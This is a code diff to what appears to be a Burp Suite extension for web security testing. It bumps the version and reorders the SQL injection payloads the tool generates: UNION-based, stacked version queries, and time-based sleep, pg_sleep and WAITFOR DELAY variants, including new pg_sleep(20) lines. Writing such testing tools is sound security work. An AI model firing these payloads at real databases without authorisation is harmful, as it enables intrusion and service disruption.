@@ -16,7 +16,7 @@ try:
 except ImportError:
     print "Failed to load dependencies."
 
-VERSION = "0.26"
+VERSION = "0.27"
 _colorful = True
 
 class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFactory):
@@ -714,7 +714,7 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
                         unionPhrase += "1337"+ str(i)
                         listSQLi.append(prefix + delimeterStart + unionPhrase + delimeterEnd + "\n")
                         listSQLi.append(prefix + delimeterStart + unionPhrase.replace(" 13370", " sleep(100)") + delimeterEnd + "\n")
-                        listSQLi.append(prefix + delimeterStart + unionPhrase.replace(" 13370", " pg_sleep(100)") + delimeterEnd + "\n")
+                        #listSQLi.append(prefix + delimeterStart + unionPhrase.replace(" 13370", " pg_sleep(100)") + delimeterEnd + "\n")
                         listSQLi.append(prefix + delimeterStart + unionPhrase.replace(" 13370", " WAITFOR DELAY "+ delimeterStart + "0:0:100" + delimeterStart) + delimeterEnd + "\n")
                         unionPhrase += ","
 
@@ -725,10 +725,12 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
                     listSQLi.append(prefix + delimeterStart + ";SELECT version FROM v$instance" + delimeterEnd + "\n")
                     listSQLi.append(prefix + delimeterStart + ";SELECT @@version" + delimeterEnd + "\n")
                     listSQLi.append(prefix + delimeterStart + ";SELECT version()" + delimeterEnd + "\n")
-                    listSQLi.append(prefix + delimeterStart + ";SELECT sleep(100)" + delimeterEnd + "\n")
-                    listSQLi.append(prefix + delimeterStart + ";SELECT pg_sleep(100)" + delimeterEnd + "\n")                    
-                    listSQLi.append(prefix + delimeterStart + ";WAITFOR DELAY "+ delimeterStart + "0:0:100" + delimeterStart + delimeterEnd + "\n")
                     listSQLi.append(prefix + delimeterStart + ";SELECT 1337" + delimeterEnd + "\n")
+                    listSQLi.append(prefix + delimeterStart + ";SELECT sleep(100)" + delimeterEnd + "\n")
+                    listSQLi.append(prefix + delimeterStart + ";WAITFOR DELAY "+ delimeterStart + "0:0:100" + delimeterStart + delimeterEnd + "\n")
+                    listSQLi.append(prefix + delimeterStart + ";SELECT pg_sleep(100)" + delimeterEnd + "\n")
+                    listSQLi.append(prefix + delimeterStart + "||pg_sleep(20)" + delimeterEnd + "\n")
+                    listSQLi.append(prefix + delimeterStart + "pg_sleep(20)" + delimeterEnd + "\n")
 
         for prefix in prefixes:
             for delimeterStart in delimeterStarts[1:]:
